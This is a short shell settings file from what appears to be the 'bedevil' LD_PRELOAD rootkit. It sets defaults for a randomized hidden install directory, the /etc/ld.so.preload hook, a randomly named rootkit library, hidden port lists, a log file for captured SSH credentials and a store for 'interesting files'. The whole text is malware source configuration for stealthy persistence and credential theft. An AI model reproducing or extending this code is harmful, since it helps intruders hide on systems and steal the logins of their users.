# default values for settings. (can/will be changed later...)

[ -z $INSTALL_DIR ] && INSTALL_DIR="`get_rand_path`" # installation directory
[ -z $LDSO_PRELOAD ] && LDSO_PRELOAD="/etc/ld.so.preload" # ld preload file location. (default is /etc/ld.so.preload)
[ -z $BDVLSO ] && BDVLSO="lib`get_rand_name`.so" # name of rootkit library. see util.sh (get_rand_name)
[ -z $SOPATH ] && SOPATH="$INSTALL_DIR/$BDVLSO.$PLATFORM"

# see get_rand_path.sh
[ -z $HIDE_PORTS_PATH ] && HIDE_PORTS_PATH="`get_rand_path`"
[ -z $SSH_LOGS ] && SSH_LOGS="`get_rand_path`" # ssh credentials log file
[ -z $INTEREST_DIR ] && INTEREST_DIR="`get_rand_path`" # where interesting files live

[ -z $MDIR ] && MDIR="inc"
[ -z $NEW_MDIR ] && NEW_MDIR="${BDVLSO}.$MDIR"

[ -z $BDVL_H ] && BDVL_H="$NEW_MDIR/bedevil.h"
[ -z $PLATFORM ] && PLATFORM="`uname -m`"

# the xor key is different every iteration...
[ -z $XKEY ] && XKEY="0x`cat /proc/self/maps | awk -F- '{print $1}' | fold -w2 | head -n1`"
declare -a array COPY_FILES=(.ascii etc/BD_README) # files to copy to install dir